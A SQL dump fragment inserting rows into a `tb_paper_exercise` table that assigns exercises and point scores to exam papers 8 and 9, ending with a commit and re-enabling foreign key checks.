INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (68, 8, 58, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (69, 8, 79, 18);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (70, 8, 80, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (71, 8, 81, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (72, 8, 82, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (73, 8, 83, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (74, 8, 84, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (75, 8, 85, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (76, 8, 66, 18);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (77, 8, 67, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (78, 8, 68, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (79, 8, 69, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (80, 8, 70, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (81, 8, 71, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (82, 8, 72, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (83, 8, 40, 14);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (84, 8, 41, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (85, 8, 42, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (86, 8, 43, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (87, 8, 44, 3);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (88, 8, 45, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (89, 8, 92, 10);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (90, 8, 93, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (91, 8, 94, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (92, 8, 95, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (93, 8, 96, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (94, 8, 97, 2);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (95, 9, 19, 50);
INSERT INTO `tb_paper_exercise` (`id`, `paper_id`, `exercise_id`, `score`) VALUES (96, 9, 60, 50);
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
